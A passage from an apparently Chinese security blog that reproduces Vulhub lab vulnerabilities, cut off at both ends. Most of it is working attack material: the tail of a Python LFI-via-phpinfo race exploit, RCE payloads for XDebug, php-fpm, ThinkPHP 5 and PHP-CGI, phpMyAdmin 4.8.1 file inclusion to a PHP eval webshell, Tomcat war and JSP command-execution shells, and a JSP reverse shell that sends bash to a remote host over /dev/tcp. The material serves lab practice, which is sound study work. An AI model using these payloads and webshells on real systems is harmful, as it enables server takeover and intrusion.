&quot;&quot;:            break        # detect the final chunk        if i.endswith(&quot;0\r\n\r\n&quot;):            break    s.close()    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)    if i == -1:        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)    print &quot;found %s at %i&quot; % (d[i:i+10],i)    # padded up a bit    return i+256def main():    print &quot;LFI With PHPInfo()&quot;    print &quot;-=&quot; * 30    if len(sys.argv) &lt; 2:        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]        sys.exit(1)    try:        host = socket.gethostbyname(sys.argv[1])    except socket.error, e:        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)        sys.exit(1)    port=80    try:        port = int(sys.argv[2])    except IndexError:        pass    except ValueError, e:        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)        sys.exit(1)    poolsz=10    try:        poolsz = int(sys.argv[3])    except IndexError:        pass    except ValueError, e:        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)        sys.exit(1)    print &quot;Getting initial offset...&quot;,      reqphp, tag, reqlfi = setup(host, port)    offset = getOffset(host, port, reqphp)    sys.stdout.flush()    maxattempts = 1000    e = threading.Event()    l = threading.Lock()    print &quot;Spawning worker pool (%d)...&quot; % poolsz    sys.stdout.flush()    tp = []    for i in range(0,poolsz):        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))    for t in tp:        t.start()    try:        while not e.wait(1):            if e.is_set():                break            with l:                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))                sys.stdout.flush()                if counter &gt;= maxattempts:                    break        print        if e.is_set():            print &quot;Woot!  \m/&quot;        else:            print &quot;:(&quot;    except KeyboardInterrupt:        print &quot;\nTelling threads to shutdown...&quot;        e.set()    print &quot;Shuttin&#39; down...&quot;    for t in tp:        t.join()if __name__==&quot;__main__&quot;:    main()</code></pre><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="shellæ–‡ä»¶æˆåŠŸå†™å…¥"></p><p>æœ€åå³å¯åœ¨lfié¡µé¢è¾¾æˆä»»æ„å‘½ä»¤æ‰§è¡Œ</p><pre><code>/lfi.php?file=/tmp/g&amp;1=system(`ls`);</code></pre><h2 id="XDebug-rce"><a href="#XDebug-rce" class="headerlink" title="XDebug rce"></a>XDebug rce</h2><p>XDebugæ˜¯PHPçš„ä¸€ä¸ªæ‰©å±•ï¼Œç”¨äºè°ƒè¯•PHPä»£ç ã€‚å¦‚æœç›®æ ‡å¼€å¯äº†è¿œç¨‹è°ƒè¯•æ¨¡å¼ï¼Œå¹¶è®¾ç½®<code>remote_connect_back = 1</code><br>è¿™ä¸ªé…ç½®ä¸‹ï¼Œæˆ‘ä»¬è®¿é—®<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>,ç›®æ ‡æœåŠ¡å™¨çš„XDebugå°†ä¼šè¿æ¥è®¿é—®è€…çš„IPï¼ˆæˆ–X-Forwarded-Forå¤´æŒ‡å®šçš„åœ°å€ï¼‰å¹¶é€šè¿‡dbgpåè®®ä¸å…¶é€šä¿¡ï¼Œæˆ‘ä»¬é€šè¿‡dbgpä¸­æä¾›çš„evalæ–¹æ³•å³å¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„PHPä»£ç ã€‚<br>(ç±»ä¼¼äºä¹‹å‰çš„java jdwp,éƒ½æ˜¯ä¸€ä¸ªè°ƒè¯•æ¨¡å¼ï¼ŒåŒæ—¶ç›‘å¬äº†æŒ‡å®šç«¯å£ï¼Œè®©æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å‘½ä»¤æ‰§è¡Œ)<br>åœ¨æ¼æ´ç¯å¢ƒphpinfoä¸­å¯ä»¥çœ‹åˆ°xdebugçš„é…ç½®<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="xdebug.ini"><br>è¿›è€Œæ‰¾åˆ°xdebugå¼€å¯<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä½¿ç”¨è„šæœ¬ï¼Œæ³¨æ„éœ€è¦python3,åŒæ—¶è¦è¿è¡Œåœ¨æœ‰å…¬ç½‘ipçš„æœºå™¨ä¸Šã€‚</p><pre><code>python3 exp.py -t http://ip:port/index.php -c &#39;system(&#39;id&#39;);&#39;</code></pre><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="id"><br>å› ä¸ºè„šæœ¬å®é™…ä¸Šå®ç°çš„æ˜¯ç›‘å¬æœ¬åœ°9000ç«¯å£å¹¶ç­‰å¾…xdebugçš„è¿æ¥ã€‚å› æ­¤è¦ä¹ˆå¤„äºåŒä¸€å†…ç½‘ï¼Œè¦ä¹ˆè‡ªå·±æœ‰å…¬ç½‘ip.</p><h2 id="php-fpm-Fastcgi"><a href="#php-fpm-Fastcgi" class="headerlink" title="php-fpm Fastcgi"></a>php-fpm Fastcgi</h2><p>å…·ä½“ä½¿ç”¨åœ¨ä¹‹å‰çš„NCTF2019 phar matches everything ä¸­å·²ç»ç”¨è¿‡äº†ã€‚<br>ç”±äºPHP-FPMé»˜è®¤ç›‘å¬9000ç«¯å£ï¼Œå¦‚æœè¿™ä¸ªç«¯å£æš´éœ²åœ¨å…¬ç½‘ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ fastcgiåè®®ï¼Œå’Œfpmè¿›è¡Œé€šä¿¡<br>è€Œfpmä¸­æœ‰ä¸€ä¸ªé‡è¦çš„ç¯å¢ƒå˜é‡å‚æ•°ï¼Œ<code>SCRIPT_FILENAME</code>ã€‚åªè¦å®ƒæ˜¯ä¸€ä¸ªæœåŠ¡å™¨ä¸Šå­˜åœ¨çš„æ–‡ä»¶ï¼Œå°±å¯ä»¥æ‰§è¡Œphpæ–‡ä»¶ã€‚<br>å·²çŸ¥åŸç†åï¼Œåé¢å®ç°å…¶å®å°±ä¸éš¾äº†ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡åè®®æ‰§è¡Œä»»æ„æ–‡ä»¶ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œåªè¦æ‰§è¡Œä¸€ä¸ª<code>auto_prepend_fileä¸ºphp://input</code>å¹¶å¼€å¯<code>allow_url_include = On</code>ã€‚å®ƒåœ¨æ‰§è¡Œä»»æ„phpæ–‡ä»¶æ—¶éƒ½ä¼šæŠŠæˆ‘ä»¬postçš„å†…å®¹å¸¦è¿›å»ã€‚è¿›è€Œè¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p><pre><code class="python">python exp.py ip /usr/local/lib/php/PEAR.php  -p 9000 -c &#39;&lt;?php echo `id`;exit();?&gt;&#39;</code></pre><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="id"></p><h2 id="phpmyadmin-4-8-1-è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#phpmyadmin-4-8-1-è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="phpmyadmin 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´"></a>phpmyadmin 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´</h2><p>CVE-2018-12613ã€‚ä¹‹å‰æ›¾ç»åœ¨å¹¿å¤–çš„æ¯”èµ›åšè¿‡ã€‚åº”è¯¥è¯´æœ‰è®¸å¤šç§getshellæ–¹å¼ï¼Œåªä¸è¿‡å„æœ‰åƒç§‹å§ã€‚<br>ä¸»è¦æ¼æ´å‡ºåœ¨db_sql.php,ç”±äºé‡Œé¢ä¸€ä¸ªurlencodeå‡½æ•°çš„ä½¿ç”¨ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡äºŒæ¬¡ç¼–ç ç»•è¿‡å¹¶æ–‡ä»¶åŒ…å«ã€‚<br><code>target=db_sql.php%253f/../../../../../../../../etc/passwd</code><br>è¿›ä¸€æ­¥å¯ä»¥getshell<br>ç›´æ¥æ‰§è¡Œsqlè¯­å¥</p><pre><code>select `&lt;?=phpinfo();?&gt;`;</code></pre><p>è®¿é—®è‡ªå·±çš„sessionç¼“å­˜æ–‡ä»¶</p><pre><code>target=db_sql.php%253f/..../../../../../.././tmp/sess_ce21bdd74738d8aaff45c82288addcb7</code></pre><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="phpinfo"><br>æ‰€ä»¥å½“ç„¶å¯ä»¥æ‰§è¡Œsqlè¯­å¥<code>select &#39;&lt;?php @eval($_GET[&quot;byc&quot;]);?&gt;&#39;</code><br>å†™å…¥ä¸€å¥è¯å¹¶åŒ…å«</p><pre><code>?target=db_sql.php%253f/..../../../../../.././tmp/sess_43a49651429f0e100e0d55c016f338b5&amp;byc=system(%27ls%27);</code></pre><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="getshell"><br>è²Œä¼¼ä¹‹å‰å¬è¯´è¿™ä¸ªç‰ˆæœ¬åªèƒ½ç”¨getçš„ä¸€å¥è¯ï¼Œæ‰€ä»¥è¿˜æ˜¯å†™getçš„ä¸€å¥è¯å°±å¥½ã€‚</p><h1 id="ThinkPHP-RCE"><a href="#ThinkPHP-RCE" class="headerlink" title="ThinkPHP RCE"></a>ThinkPHP RCE</h1><h2 id="ThinkPHP5-5-0-22-5-1-29"><a href="#ThinkPHP5-5-0-22-5-1-29" class="headerlink" title="ThinkPHP5 5.0.22/5.1.29"></a>ThinkPHP5 5.0.22/5.1.29</h2><p>å¤§è‡´çœ‹äº†ä¸‹ï¼Œè²Œä¼¼æ˜¯å› ä¸ºå‘½åç©ºé—´çš„ç¬¦å·ä½¿ç”¨å¯¼è‡´æˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„ç±»<br>payload</p><pre><code>?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code></pre><p>å¯ä»¥ç›´æ¥rce<br><code>&amp;vars[0]=system&amp;vars[1][]=ls</code><br>ä¹Ÿå¯ä»¥å†™ä¸€ä¸ªshell.php</p><pre><code>?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=&lt;%3fphp+%40eval(%24_GET%5b%27byc%27%5d)%3b%3f&gt;</code></pre><h2 id="ThinkPHP5-5-0-23"><a href="#ThinkPHP5-5-0-23" class="headerlink" title="ThinkPHP5 5.0.23"></a>ThinkPHP5 5.0.23</h2><p>ä¹Ÿæ˜¯æ¯”è¾ƒå¸¸è§çš„ä¸€ä¸ªç‰ˆæœ¬</p><pre><code>GET:?s=captchaPOST:_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h2 id="Ghostcat-CVE-2020-1938"><a href="#Ghostcat-CVE-2020-1938" class="headerlink" title="Ghostcat CVE-2020-1938"></a>Ghostcat CVE-2020-1938</h2><p>å¹½çµçŒ«ã€‚è¿™é‡Œçš„ç¯å¢ƒåªæä¾›äº†æ–‡ä»¶è¯»å–.</p><pre><code class="python"> python3 ajpShooter.py http://vpsip/ 8009 /WEB-INF/web.xml read</code></pre><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æƒ³è¦è¿›è¡ŒRCEè¿˜éœ€è¦ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚<br>è¿™é‡Œç›´æ¥è¿›å…¥å®¹å™¨å¢åŠ ä¸€ä¸ªexp.jsp<br><code>docker exec -it å®¹å™¨id /bin/bash</code><br>æ²¡æœ‰vim.ç”¨curlææ¥ä¸€ä¸ªexp.jspåˆ°/WEB-INFä¸‹</p><pre><code class="jsp">&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;&lt;% out.println(&quot;Executing command&quot;);Process p = Runtime.getRuntime().exec(&quot;ls /&quot;);OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) {  out.println(disr);   disr = dis.readLine(); }%&gt;</code></pre><p>ä½¿ç”¨å‘½ä»¤</p><pre><code> python3 ajpShooter.py http://vpsip/ 8009 /WEB-INF/exp.jsp eval</code></pre><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å°è¯•äº†ä¸‹å¼¹shellçš„å‘½ä»¤å¤±è´¥äº†ã€‚ä½†æ˜¯é—®é¢˜æ‰¾ä¸å‡ºæ¥ã€‚æœ€å¥½åœ¨æ¯”èµ›ä¸­ä¸è¦èŠ±æ—¶é—´æ‰§ç€äºå¼¹shellã€‚å¯èƒ½ä¼šæœ‰å¤§é—®é¢˜ã€‚</p><p>è¡¥ï¼šç»éƒå¸ˆå‚…æŒ‡ç‚¹æ˜ç™½äº†æ˜¯jspçš„é—®é¢˜ã€‚å…·ä½“åŸå› ä¹‹åè§£é‡Šï¼Œç®€è¦è¯´ä¸»è¦æ˜¯javaå¼¹shellæ—¶ä½¿ç”¨å­—ç¬¦ä¸²ä¸å­—ç¬¦ä¸²æ•°ç»„çš„åŒºåˆ«ã€‚</p><pre><code class="javascript">&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;&lt;%    String[] cmdstr = { &quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&quot; };    Runtime.getRuntime().exec(cmdstr);%&gt;</code></pre><p>è¿™æ ·å°±èƒ½å¼¹shelläº†ã€‚</p><h2 id="tomcat7-å¼±å£ä»¤-amp-amp-åå°getshellæ¼æ´"><a href="#tomcat7-å¼±å£ä»¤-amp-amp-åå°getshellæ¼æ´" class="headerlink" title="tomcat7+ å¼±å£ä»¤ &amp;&amp; åå°getshellæ¼æ´"></a>tomcat7+ å¼±å£ä»¤ &amp;&amp; åå°getshellæ¼æ´</h2><p>å› ä¸ºWUSTé‚£é“é¢˜è¿‡æ¥å¤ç°äº†ä¸‹ã€‚è¿˜æƒŠäººçš„é‡ç°äº†ï¼šé‡å¤ä½¿ç”¨ä¸€ä¸ªä¸€æ¬¡æ€§çš„cookieä¹Ÿä¼šé€ æˆ403çš„é—®é¢˜ã€‚çœ‹æ¥é¢˜ç›®æœç„¶æºäºç”Ÿæ´»ã€‚</p><p>æ­¥éª¤å¾ˆç®€å•ã€‚ç¬¬ä¸€æ­¥tomcatå¼±å£ä»¤ç™»å…¥<code>manager/html</code>åå°<br>æ­£å¸¸å®‰è£…çš„æƒ…å†µä¸‹ï¼Œtomcat8ä¸­é»˜è®¤æ²¡æœ‰ä»»ä½•ç”¨æˆ·ï¼Œä¸”manageré¡µé¢åªå…è®¸æœ¬åœ°IPè®¿é—®ã€‚åªæœ‰ç®¡ç†å‘˜æ‰‹å·¥ä¿®æ”¹äº†è¿™äº›å±æ€§çš„æƒ…å†µä¸‹ï¼Œæ‰å¯ä»¥è¿›è¡Œæ”»å‡»ã€‚<br>ç”±äºåå°æ”¯æŒéƒ¨ç½²waræ–‡ä»¶ï¼Œç›´æ¥ä¸Šä¼ warå³å¯getshell<br>æ­¥éª¤:<br>1.cmd.jsp</p><pre><code class="javascript">&lt;%%&gt;</code></pre><p><code>jar cvf webshell.war webshell.jsp</code><br>ç”Ÿæˆwebshell<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/10.5.PNG" class="lazyload" data-srcset="10.5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>2.å‘½ä»¤æ‰§è¡Œ<br><code>/webshell/exp.jsp?pwd=023&amp;i=id)</code><br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h1 id="PHP-CGIè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2012-1823ï¼‰"><a href="#PHP-CGIè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2012-1823ï¼‰" class="headerlink" title="PHP-CGIè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2012-1823ï¼‰"></a>PHP-CGIè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2012-1823ï¼‰</h1><p>å‡ºç°åœ¨ä»¥cgiæ¨¡å¼è¿è¡Œçš„phpä¸­ï¼Œå½±å“ç‰ˆæœ¬ php &lt; 5.3.12 or php &lt; 5.4.2<br>ç®€å•è¯´å°±æ˜¯å‘½ä»¤è¡Œçš„å‚æ•°å¯ä»¥é€šè¿‡querysringçš„å½¢å¼ä¼ å…¥ã€‚<br>æ¯”å¦‚ç›´æ¥ä¼ -s<br><code>index.php?-s</code><br>ç›´æ¥å›æ˜¾æºç ã€‚<br>è¿›ä¸€æ­¥åˆ©ç”¨è¿™ç‚¹ï¼Œåˆ™é€šè¿‡-dä½¿ç”¨<code>php://input</code>è¾¾æˆæ–‡ä»¶åŒ…å«=&gt;å‘½ä»¤æ‰§è¡Œã€‚<br>payload<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/12.PNG" class="lazyload" data-srcset="12.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p><code>POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</code></p><pre><code>data: &lt;?php echo `ls`; ?&gt;</code></pre><h1 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h1><h2 id="Apache-HTTPD-å¤šåç¼€è§£ææ¼æ´"><a href="#Apache-HTTPD-å¤šåç¼€è§£ææ¼æ´" class="headerlink" title="Apache HTTPD å¤šåç¼€è§£ææ¼æ´"></a>Apache HTTPD å¤šåç¼€è§£ææ¼æ´</h2><p>Apache HTTPD æ”¯æŒä¸€ä¸ªæ–‡ä»¶æ‹¥æœ‰å¤šä¸ªåç¼€<br>å‡å¦‚é…ç½®å¦‚ä¸‹</p><pre><code class="php">AddHandler application/x-httpd-php .php</code></pre><p>é‚£ä¹ˆåœ¨æœ‰å¤šä¸ªåç¼€çš„æƒ…å†µä¸‹ï¼Œåªè¦ä¸€ä¸ªæ–‡ä»¶å«æœ‰.phpåç¼€çš„æ–‡ä»¶å³å°†è¢«è¯†åˆ«æˆPHPæ–‡ä»¶<br>æ‰€ä»¥å¯ä»¥ä½¿ç”¨ä¸Šä¼ æ—¶åŠ åç¼€ç»•è¿‡</p><p>è®¿é—®ä¸Šä¼ 1.php.jpgå³å¯å‘ç°å…¶è¢«è§£æä¸ºphp<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/13.PNG" class="lazyload" data-srcset="13.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="Apache-SSI-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#Apache-SSI-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</h2><p>ä¹‹å‰æ¥è§¦è¿‡çš„shtml çš„å‘½ä»¤æ‰§è¡Œ<br><code>&lt;!--#exec cmd=&quot;ls&quot; --&gt;</code></p><p>ä¹‹å‰HITCON2018 WhySoSerialä¸­ä¹Ÿæœ‰ç”¨åˆ°å®ƒè¿›è¡Œæ–‡ä»¶åŒ…å«çš„åˆ©ç”¨,è¿™ä¹Ÿæ˜¯shtmlçš„Server-Side Includeså³ssiçš„ç‰¹æ€§äº†ã€‚</p><h2 id="Apache-HTTPD-æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰"><a href="#Apache-HTTPD-æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰" class="headerlink" title="Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰"></a>Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰</h2><p>ç¯å¢ƒæœ‰é—®é¢˜â€¦æ²¡æ³•å¤ç°äº†<br>å¤§æ¦‚å°±æ˜¯ä¸Šä¼ phpè¢«banæ—¶,é€šè¿‡.php%0aç»•è¿‡ï¼Œä½†æ˜¯è®¿é—®æ–‡ä»¶æ—¶æ—¶ä»èƒ½è¢«è§£ææˆphp</p><h1 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h1><h2 id="Nginx-è§£ææ¼æ´å¤ç°"><a href="#Nginx-è§£ææ¼æ´å¤ç°" class="headerlink" title="Nginx è§£ææ¼æ´å¤ç°"></a>Nginx è§£ææ¼æ´å¤ç°</h2><p>è¿™ä¸ªæ´ç›´æ¥å¸®æˆ‘è§£å†³æŸå…¥ç¾¤é¢˜å›°æ‰°äº†å¥½ä¹…çš„ä¸€ä¸ªç‚¹ã€‚ä¹Ÿè§£å†³äº†æˆ‘åŸæ¥åœ¨åšæœ‰å…³nginxæœ‰å…³æœåŠ¡çš„é¢˜ç›®æ—¶é‡åˆ°çš„å¥‡ç‰¹ç°è±¡ã€‚<br>è¯¥æ¼æ´ä¸Nginxã€phpç‰ˆæœ¬æ— å…³ï¼Œå±äºç”¨æˆ·é…ç½®ä¸å½“é€ æˆçš„è§£ææ¼æ´</p><p>è¿›å…¥ç¯å¢ƒã€‚ç›´æ¥ä¸Šä¼ ä¸€ä¸ª<code>GIF89A&lt;?php @eval($_POST[0]);?&gt;</code>çš„1.jpg<br>ç»•è¿‡æ£€æµ‹ï¼Œä¸Šä¼ å›¾ç‰‡ã€‚</p><p>åŒæ—¶è®¿é—®å›¾ç‰‡ã€‚<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/14.PNG" class="lazyload" data-srcset="14.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä½†æ˜¯ä¸€æ—¦åœ¨jpgååŠ ä¸Š<code>/.php</code>è¿™ä¸ªé©¬å°±å°†è¢«ä½œä¸ºphpè§£æ<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/15.PNG" class="lazyload" data-srcset="15.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æˆåŠŸgetshell</p><p>å› æ­¤å¯ä»¥ç”¨åœ¨æŸäº›ç‰¹æ®Šçš„ä¸Šä¼ é¢˜ç›®ä¸­ã€‚å¾—åˆ°webshellç«Ÿå¯ä»¥å¦‚æ­¤ç®€å•,ä¹Ÿç®—æ˜¯ä¸€ä¸ªå°æŠ€å·§äº†ã€‚</p><p>è‡³äºåŸå› çš„è¯,è¿˜æ˜¯ç”±äºnginxçš„é…ç½®é—®é¢˜ã€‚<br>ä¸€æ—¦é…ç½®æˆæŠŠä»¥.phpç»“å°¾çš„æ–‡ä»¶äº¤ç»™fastcgiå¤„ç†,é‡åˆ°æˆ‘ä»¬çš„/.phpå°±ç›´æ¥æ‰”ç»™phpäº†ã€‚<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/16.PNG" class="lazyload" data-srcset="16.PNG" 